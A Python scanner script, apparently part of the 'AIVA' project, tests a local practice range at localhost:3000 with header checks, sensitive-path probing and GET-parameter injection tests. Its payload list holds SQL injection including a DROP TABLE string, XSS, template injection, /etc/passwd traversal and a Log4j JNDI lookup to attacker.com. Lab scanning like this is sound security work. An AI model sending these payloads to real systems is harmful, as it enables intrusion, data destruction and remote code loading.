#!/usr/bin/env python3
"""
AIVA 靶場安全掃描實測腳本

針對 http://localhost:3000 執行全面的安全掃描測試
"""

import asyncio
import sys
import os
import json
import time
import requests
from pathlib import Path
from typing import Dict, Any, List

# 添加路徑
sys.path.append(os.path.join(os.path.dirname(__file__), 'services', 'core'))
sys.path.append(os.path.join(os.path.dirname(__file__), 'services'))

class AIVARangeSecurityTester:
    """AIVA 靶場安全測試器"""
    
    def __init__(self, target_url: str = "http://localhost:3000"):
        self.target_url = target_url
        self.results = {}
        
    async def test_basic_connectivity(self):
        """基本連接性測試"""
        print("🎯 基本連接性測試")
        print("=" * 40)
        
        try:
            response = requests.get(self.target_url, timeout=10)
            
            print(f"✅ 目標可達: {self.target_url}")
            print(f"📊 HTTP 狀態: {response.status_code}")
            print(f"🔍 伺服器: {response.headers.get('Server', 'Unknown')}")
            print(f"📄 內容類型: {response.headers.get('Content-Type', 'Unknown')}")
            print(f"🔒 安全標頭:")
            
            security_headers = [
                'X-Content-Type-Options',
                'X-Frame-Options', 
                'X-XSS-Protection',
                'Strict-Transport-Security',
                'Content-Security-Policy'
            ]
            
            for header in security_headers:
                value = response.headers.get(header, 'Missing')
                status = "✅" if value != 'Missing' else "❌"
                print(f"  {status} {header}: {value}")
            
            self.results['connectivity'] = {
                'status': 'success',
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'content_length': len(response.text)
            }
            
            return True
            
        except Exception as e:
            print(f"❌ 連接失敗: {e}")
            self.results['connectivity'] = {
                'status': 'failed',
                'error': str(e)
            }
            return False
    
    async def test_directory_discovery(self):
        """目錄發現測試"""
        print("\n🎯 目錄發現測試")
        print("=" * 40)
        
        common_paths = [
            '/admin',
            '/login', 
            '/api',
            '/docs',
            '/swagger',
            '/robots.txt',
            '/sitemap.xml',
            '/.env',
            '/config',
            '/backup'
        ]
        
        discovered = []
        
        for path in common_paths:
            try:
                url = f"{self.target_url}{path}"
                response = requests.get(url, timeout=5)
                
                if response.status_code == 200:
                    print(f"✅ 發現: {path} (狀態: {response.status_code})")
                    discovered.append({
                        'path': path,
                        'status_code': response.status_code,
                        'content_length': len(response.text)
                    })
                elif response.status_code in [301, 302]:
                    print(f"🔄 重定向: {path} (狀態: {response.status_code})")
                    discovered.append({
                        'path': path,
                        'status_code': response.status_code,
                        'redirect': response.headers.get('Location', '')
                    })
                else:
                    print(f"⚪ 不存在: {path} (狀態: {response.status_code})")
                    
            except Exception as e:
                print(f"❌ 測試 {path} 失敗: {e}")
        
        self.results['directory_discovery'] = {
            'discovered_paths': discovered,
            'total_tested': len(common_paths),
            'found_count': len(discovered)
        }
        
        return discovered
    
    async def test_injection_vulnerabilities(self):
        """注入漏洞測試"""
        print("\n🎯 注入漏洞測試")
        print("=" * 40)
        
        # 基本的注入測試 payload
        injection_payloads = [
            "' OR '1'='1",
            '" OR "1"="1',
            '1; DROP TABLE users--',
            '<script>alert("XSS")</script>',
            '{{7*7}}',  # SSTI
            '../../../etc/passwd',  # LFI
            '${jndi:ldap://attacker.com/x}'  # Log4j
        ]
        
        vulnerabilities = []
        
        # 測試常見參數
        test_params = ['id', 'user', 'search', 'q', 'name']
        
        for param in test_params:
            for payload in injection_payloads:
                try:
                    # GET 參數測試
                    url = f"{self.target_url}/?{param}={payload}"
                    response = requests.get(url, timeout=5)
                    
                    # 簡單的漏洞檢測邏輯
                    content = response.text.lower()
                    
                    if any(indicator in content for indicator in [
                        'sql syntax', 'mysql_fetch', 'ora-', 'error in your sql',
                        'alert("xss")', 'alert(\'xss\')', 
                        'root:x:', '/bin/bash'
                    ]):
                        print(f"⚠️  可能的漏洞: {param} + {payload[:20]}...")
                        vulnerabilities.append({
                            'parameter': param,
                            'payload': payload,
                            'method': 'GET',
                            'response_contains': [indicator for indicator in [
                                'sql syntax', 'mysql_fetch', 'ora-', 'error in your sql',
                                'alert("xss")', 'alert(\'xss\')', 
                                'root:x:', '/bin/bash'
                            ] if indicator in content]
                        })
                    
                except Exception as e:
                    print(f"❌ 測試注入失敗: {e}")
        
        if vulnerabilities:
            print(f"⚠️  發現 {len(vulnerabilities)} 個潛在漏洞")
        else:
            print("✅ 未發現明顯的注入漏洞")
        
        self.results['injection_tests'] = {
            'vulnerabilities': vulnerabilities,
            'payloads_tested': len(injection_payloads) * len(test_params),
            'vulnerability_count': len(vulnerabilities)
        }
        
        return vulnerabilities
    
    async def test_ai_analysis(self):
        """AI 輔助分析測試"""
        print("\n🎯 AI 輔助分析測試") 
        print("=" * 40)
        
        try:
            # 嘗試使用 AIVA AI 系統分析結果
            from aiva_core.ai_engine import AIModelManager
            
            manager = AIModelManager()
            await manager.initialize_models(input_size=64, num_tools=8)
            
            # 構建分析查詢
            analysis_context = {
                'target': self.target_url,
                'scan_results': self.results
            }
            
            queries = [
                "分析掃描結果中的安全風險",
                "建議針對此目標的進一步測試策略",
                "評估目標系統的整體安全性"
            ]
            
            ai_analyses = []
            
            for query in queries:
                result = await manager.make_decision(
                    query=query,
                    context=analysis_context,
                    use_rag=True
                )
                
                if result['status'] == 'success':
                    print(f"✅ AI 分析: {query}")
                    print(f"   信心度: {result['result'].get('confidence', 0):.2f}")
                    ai_analyses.append({
                        'query': query,
                        'confidence': result['result'].get('confidence', 0),
                        'method': result['result'].get('method', 'unknown')
                    })
                else:
                    print(f"❌ AI 分析失敗: {query}")
            
            self.results['ai_analysis'] = {
                'analyses_completed': len(ai_analyses),
                'average_confidence': sum(a['confidence'] for a in ai_analyses) / len(ai_analyses) if ai_analyses else 0,
                'analyses': ai_analyses
            }
            
            print(f"📊 完成 {len(ai_analyses)} 項 AI 分析")
            
            return ai_analyses
            
        except Exception as e:
            print(f"❌ AI 分析失敗: {e}")
            self.results['ai_analysis'] = {
                'status': 'failed',
                'error': str(e)
            }
            return []
    
    async def generate_report(self):
        """生成測試報告"""
        print("\n📋 生成測試報告")
        print("=" * 40)
        
        report = {
            'target': self.target_url,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'results': self.results,
            'summary': self._generate_summary()
        }
        
        # 保存報告
        report_file = Path("aiva_range_security_report.json")
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        print(f"✅ 報告已保存: {report_file.absolute()}")
        
        # 打印摘要
        summary = report['summary']
        print(f"\n📊 測試摘要:")
        print(f"  • 目標連接性: {'✅' if summary['connectivity_ok'] else '❌'}")
        print(f"  • 發現路徑: {summary['paths_found']}")
        print(f"  • 潛在漏洞: {summary['vulnerabilities_found']}")
        print(f"  • AI 分析: {summary['ai_analyses_completed']}")
        print(f"  • 整體風險級別: {summary['risk_level']}")
        
        return report
    
    def _generate_summary(self):
        """生成測試摘要"""
        connectivity_ok = self.results.get('connectivity', {}).get('status') == 'success'
        paths_found = len(self.results.get('directory_discovery', {}).get('discovered_paths', []))
        vulnerabilities_found = len(self.results.get('injection_tests', {}).get('vulnerabilities', []))
        ai_analyses_completed = self.results.get('ai_analysis', {}).get('analyses_completed', 0)
        
        # 簡單的風險評估
        risk_score = 0
        if not connectivity_ok:
            risk_score += 1
        if paths_found > 3:
            risk_score += 2
        if vulnerabilities_found > 0:
            risk_score += 3
        
        risk_levels = ['低', '中', '高', '嚴重']
        risk_level = risk_levels[min(risk_score, 3)]
        
        return {
            'connectivity_ok': connectivity_ok,
            'paths_found': paths_found,
            'vulnerabilities_found': vulnerabilities_found,
            'ai_analyses_completed': ai_analyses_completed,
            'risk_score': risk_score,
            'risk_level': risk_level
        }

async def main():
    """主測試流程"""
    print("🚀 AIVA 靶場安全掃描實測開始")
    print("=" * 60)
    
    tester = AIVARangeSecurityTester()
    
    # 執行測試序列
    tests = [
        tester.test_basic_connectivity(),
        tester.test_directory_discovery(), 
        tester.test_injection_vulnerabilities(),
        tester.test_ai_analysis(),
        tester.generate_report()
    ]
    
    start_time = time.time()
    
    for test in tests:
        await test
    
    end_time = time.time()
    
    print(f"\n🏁 測試完成 (耗時: {end_time - start_time:.2f}s)")
    print("=" * 60)

if __name__ == "__main__":
    asyncio.run(main())